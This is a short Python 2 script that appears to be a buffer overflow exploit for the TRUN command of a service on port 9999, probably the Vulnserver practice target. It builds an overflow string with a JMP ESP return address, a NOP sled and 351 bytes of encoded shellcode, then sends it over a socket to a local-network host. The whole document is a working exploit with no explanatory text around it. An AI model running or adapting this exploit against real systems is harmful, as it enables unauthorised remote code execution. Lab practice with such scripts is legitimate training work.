#!/usr/bin/python
import socket


host = "192.168.1.213"

port = 9999

# 625011AF JMP ESP
# Payload size: 351 bytes

buf =  b""
buf += b"\xda\xc8\xd9\x74\x24\xf4\x58\xbd\xa7\x1f\xdd\x34\x2b"
buf += b"\xc9\xb1\x52\x31\x68\x17\x83\xc0\x04\x03\xcf\x0c\x3f"
buf += b"\xc1\xf3\xdb\x3d\x2a\x0b\x1c\x22\xa2\xee\x2d\x62\xd0"
buf += b"\x7b\x1d\x52\x92\x29\x92\x19\xf6\xd9\x21\x6f\xdf\xee"
buf += b"\x82\xda\x39\xc1\x13\x76\x79\x40\x90\x85\xae\xa2\xa9"
buf += b"\x45\xa3\xa3\xee\xb8\x4e\xf1\xa7\xb7\xfd\xe5\xcc\x82"
buf += b"\x3d\x8e\x9f\x03\x46\x73\x57\x25\x67\x22\xe3\x7c\xa7"
buf += b"\xc5\x20\xf5\xee\xdd\x25\x30\xb8\x56\x9d\xce\x3b\xbe"
buf += b"\xef\x2f\x97\xff\xdf\xdd\xe9\x38\xe7\x3d\x9c\x30\x1b"
buf += b"\xc3\xa7\x87\x61\x1f\x2d\x13\xc1\xd4\x95\xff\xf3\x39"
buf += b"\x43\x74\xff\xf6\x07\xd2\x1c\x08\xcb\x69\x18\x81\xea"
buf += b"\xbd\xa8\xd1\xc8\x19\xf0\x82\x71\x38\x5c\x64\x8d\x5a"
buf += b"\x3f\xd9\x2b\x11\xd2\x0e\x46\x78\xbb\xe3\x6b\x82\x3b"
buf += b"\x6c\xfb\xf1\x09\x33\x57\x9d\x21\xbc\x71\x5a\x45\x97"
buf += b"\xc6\xf4\xb8\x18\x37\xdd\x7e\x4c\x67\x75\x56\xed\xec"
buf += b"\x85\x57\x38\xa2\xd5\xf7\x93\x03\x85\xb7\x43\xec\xcf"
buf += b"\x37\xbb\x0c\xf0\x9d\xd4\xa7\x0b\x76\x1b\x9f\x12\x52"
buf += b"\xf3\xe2\x14\x5b\xbf\x6a\xf2\x31\xaf\x3a\xad\xad\x56"
buf += b"\x67\x25\x4f\x96\xbd\x40\x4f\x1c\x32\xb5\x1e\xd5\x3f"
buf += b"\xa5\xf7\x15\x0a\x97\x5e\x29\xa0\xbf\x3d\xb8\x2f\x3f"
buf += b"\x4b\xa1\xe7\x68\x1c\x17\xfe\xfc\xb0\x0e\xa8\xe2\x48"
buf += b"\xd6\x93\xa6\x96\x2b\x1d\x27\x5a\x17\x39\x37\xa2\x98"
buf += b"\x05\x63\x7a\xcf\xd3\xdd\x3c\xb9\x95\xb7\x96\x16\x7c"
buf += b"\x5f\x6e\x55\xbf\x19\x6f\xb0\x49\xc5\xde\x6d\x0c\xfa"
buf += b"\xef\xf9\x98\x83\x0d\x9a\x67\x5e\x96\xaa\x2d\xc2\xbf"
buf += b"\x22\xe8\x97\xfd\x2e\x0b\x42\xc1\x56\x88\x66\xba\xac"
buf += b"\x90\x03\xbf\xe9\x16\xf8\xcd\x62\xf3\xfe\x62\x82\xd6"



buffer = "A" * 2003
buffer += "\xAF\x11\x50\x62"
buffer += "\x90" * 10
buffer += buf
buffer += "\x90" * (5011 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

s.recv(1024)
print "[+] Buffer sent!"
s.send("TRUN /.:/" + buffer)
s.recv(1024)

s.close()